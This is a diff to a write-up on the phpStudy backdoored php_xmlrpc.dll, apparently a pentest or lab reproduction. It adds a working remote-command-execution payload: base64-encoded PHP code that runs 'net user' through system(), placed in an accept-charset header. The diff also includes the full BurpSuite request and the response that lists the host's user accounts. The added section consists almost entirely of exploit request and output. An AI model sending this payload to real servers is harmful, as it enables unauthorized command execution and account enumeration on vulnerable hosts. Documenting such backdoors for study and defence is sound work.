@@ -40,6 +40,51 @@ D:\Pentester\phpStudy>md5sum  .\php\php-5.4.45\ext\php_xmlrpc.dll
 
 ![](./PHP-5.4.45.jpg)
 
+![](./payload.jpg)
+
+`accept-charset: echo system("net user");echo PHP_VERSION;`
+
+`Base64 encode`
+
+`accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7ZWNobyBQSFBfVkVSU0lPTjs=`
+
+## BurpSuite Request
+
+```
+GET / HTTP/1.1
+Host: 172.16.9.174
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Connection: close
+accept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7ZWNobyBQSFBfVkVSU0lPTjs=
+Accept-Encoding: gzip,deflate
+Upgrade-Insecure-Requests: 1
+
+
+```
+## BurpSuite Response
+
+```
+HTTP/1.1 200 OK
+Date: Tue, 24 Sep 2019 15:06:18 GMT
+Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
+X-Powered-By: PHP/5.4.45
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 17223
+
+
+\\JAS502N µÄÓÃ»§ÕÊ»§
+
+-------------------------------------------------------------------------------
+Administrator            CTF                      DefaultAccount           
+defaultuser0             Guest                    
+ÃüÁî³É¹¦Íê³É¡£
+
+5.4.45
+```
+
 
 ## 参考链接
 
